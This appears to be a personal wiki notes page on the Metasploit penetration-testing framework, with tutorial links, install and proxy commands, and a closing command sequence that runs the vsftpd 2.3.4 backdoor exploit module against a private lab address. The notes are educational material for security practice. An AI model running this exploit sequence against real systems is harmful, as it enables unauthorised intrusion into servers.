---
{"dg-publish":true,"permalink":"/net/sec/tools/metasploit/"}
---



- [[metasploit - doing an exploit\|metasploit - doing an exploit]]
- [[metasploit - port scan\|metasploit - port scan]]
- [[metasploit - docker\|metasploit - docker]]
- [[metasploit - Global options\|metasploit - Global options]]
- [[metasploit - flags\|metasploit - flags]]


---

- [Docs (Metasplot Pro)](https://docs.rapid7.com/metasploit/)
- [Docs - nooblinux tutorial](https://nooblinux.com/metasploit-tutorial/)
- [MUO](https://www.makeuseof.com/beginners-guide-metasploit-kali-linux/)
- [SMB Exploit Article](https://medium.com/dark-roast-security/dark-side-126-using-metasploit-to-exploit-smb-89108ba609aa)



## Using with [[burpsuite\|burpsuite]]

```shell-session
set PROXIES HTTP:127.0.0.1:8080
```
## Installation in [[Kali Linux\|Kali Linux]]

- https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/

```bash
sudo msfdb init
```


## Components

### msfconsole

### msfdb

### msfvenom

### msfinterpreter



## Location

```bash
cd /usr/share/Metasploit-Framework
```


** [Metasploit commands - Hacking Tutorials](https://www.hackingtutorials.org/metasploit-tutorials/metasploit-commands/)





---


```
search vsftpd
```

```
exploit/unix/ftp/vsftpd_234_backdoor
```

```
show options
```

```
set RHOSTS 192.168.64.5
```

```
exploit
```

